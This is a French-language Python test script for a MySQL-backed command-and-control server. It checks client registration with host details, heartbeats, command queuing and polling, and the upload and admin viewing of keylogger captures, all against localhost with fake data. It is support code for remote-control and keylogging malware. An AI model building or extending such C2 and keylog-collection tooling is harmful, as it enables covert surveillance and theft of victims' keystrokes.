"""
Script de test pour le serveur C2 avec MySQL
Lance ce script pendant que le serveur tourne
"""

import requests
import json
import time
import uuid

# Configuration
SERVER_URL = "http://localhost:5000"

def test_server():
    """Tester toutes les fonctionnalités du serveur"""
    
    print("="*60)
    print("🧪 TEST DU SERVEUR C2 MYSQL")
    print("="*60)
    
    # Générer un ID client unique
    client_id = f"test_client_{uuid.uuid4().hex[:8]}"
    
    # Test 1: Enregistrement d'un client
    print("\n[TEST 1] Enregistrement du client...")
    try:
        response = requests.post(f"{SERVER_URL}/register", json={
            "client_id": client_id,
            "system_info": {
                "os": "Windows 10",
                "hostname": "TEST-PC",
                "user": "test_user",
                "ip": "192.168.1.100"
            }
        })
        
        if response.status_code == 200:
            print(f"✅ Client enregistré: {client_id}")
            print(f"   Réponse: {response.json()}")
        else:
            print(f"❌ Erreur: {response.status_code}")
            return
    except Exception as e:
        print(f"❌ Erreur de connexion: {e}")
        print("⚠️ Vérifiez que le serveur tourne (python server.py)")
        return
    
    # Test 2: Heartbeat
    print("\n[TEST 2] Heartbeat du client...")
    try:
        response = requests.post(f"{SERVER_URL}/heartbeat", json={
            "client_id": client_id
        })
        
        if response.status_code == 200:
            print(f"✅ Heartbeat envoyé")
            print(f"   Réponse: {response.json()}")
    except Exception as e:
        print(f"❌ Erreur: {e}")
    
    # Test 3: Lister tous les clients
    print("\n[TEST 3] Liste des clients...")
    try:
        response = requests.get(f"{SERVER_URL}/admin/clients")
        
        if response.status_code == 200:
            clients = response.json()
            print(f"✅ {len(clients)} client(s) trouvé(s)")
            for client in clients:
                print(f"   - {client['client_id']}")
                print(f"     OS: {client['system_info'].get('os', 'N/A')}")
                print(f"     Online: {client.get('online', False)}")
    except Exception as e:
        print(f"❌ Erreur: {e}")
    
    # Test 4: Envoyer une commande
    print("\n[TEST 4] Envoi d'une commande...")
    command_id = f"cmd_{uuid.uuid4().hex[:8]}"
    try:
        response = requests.post(f"{SERVER_URL}/admin/process/{client_id}", json={
            "action": "test_command",
            "data": {
                "message": "Test depuis script"
            }
        })
        
        if response.status_code == 200:
            result = response.json()
            print(f"✅ Commande envoyée")
            print(f"   Command ID: {result.get('command_id')}")
    except Exception as e:
        print(f"❌ Erreur: {e}")
    
    # Test 5: Récupérer les commandes (comme ferait le client)
    print("\n[TEST 5] Récupération des commandes...")
    try:
        response = requests.get(f"{SERVER_URL}/commands", json={
            "client_id": client_id
        })
        
        if response.status_code == 200:
            commands = response.json()
            print(f"✅ {len(commands)} commande(s) en attente")
            for cmd in commands:
                print(f"   - Action: {cmd['action']}")
                print(f"     ID: {cmd['command_id']}")
    except Exception as e:
        print(f"❌ Erreur: {e}")
    
    # Test 6: Envoyer des keylogs
    print("\n[TEST 6] Envoi de keylogs...")
    try:
        response = requests.post(f"{SERVER_URL}/keylog_data", json={
            "client_id": client_id,
            "logs": [
                {
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "window": "Notepad - test.txt",
                    "key": "Hello",
                    "event": "keypress"
                },
                {
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "window": "Chrome - Google",
                    "key": "World",
                    "event": "keypress"
                }
            ]
        })
        
        if response.status_code == 200:
            print(f"✅ Keylogs envoyés")
            print(f"   Réponse: {response.json()}")
    except Exception as e:
        print(f"❌ Erreur: {e}")
    
    # Test 7: Statistiques des keylogs
    print("\n[TEST 7] Statistiques des keylogs...")
    try:
        response = requests.get(f"{SERVER_URL}/admin/keylogs_stats")
        
        if response.status_code == 200:
            stats = response.json()
            print(f"✅ Statistiques récupérées")
            print(f"   Total clients: {stats.get('total_clients_with_logs', 0)}")
            print(f"   Total logs: {stats.get('total_logs_stored', 0)}")
    except Exception as e:
        print(f"❌ Erreur: {e}")
    
    # Test 8: Récupérer les keylogs du client
    print("\n[TEST 8] Récupération des keylogs du client...")
    try:
        response = requests.get(f"{SERVER_URL}/admin/keylogs/{client_id}")
        
        if response.status_code == 200:
            result = response.json()
            logs = result.get('logs', [])
            print(f"✅ {len(logs)} keylog(s) récupéré(s)")
            for log in logs[:3]:  # Afficher les 3 premiers
                print(f"   - [{log['timestamp']}] {log['window']}: {log['key']}")
    except Exception as e:
        print(f"❌ Erreur: {e}")
    
    print("\n" + "="*60)
    print("✅ TESTS TERMINÉS")
    print("="*60)
    print("\n📊 Vérifications dans MySQL:")
    print("1. Ouvre MySQL Workbench ou phpMyAdmin")
    print("2. Connecte-toi à la base 'c2_database'")
    print("3. Vérifie les tables:")
    print("   - clients (doit contenir ton client de test)")
    print("   - commands (doit contenir les commandes)")
    print("   - keylogs (doit contenir les keylogs)")
    print("   - activity_log (doit contenir l'historique)")
    print("\n🌐 Interface Web:")
    print(f"   http://localhost:5000/admin/clients")


if __name__ == "__main__":
    test_server()
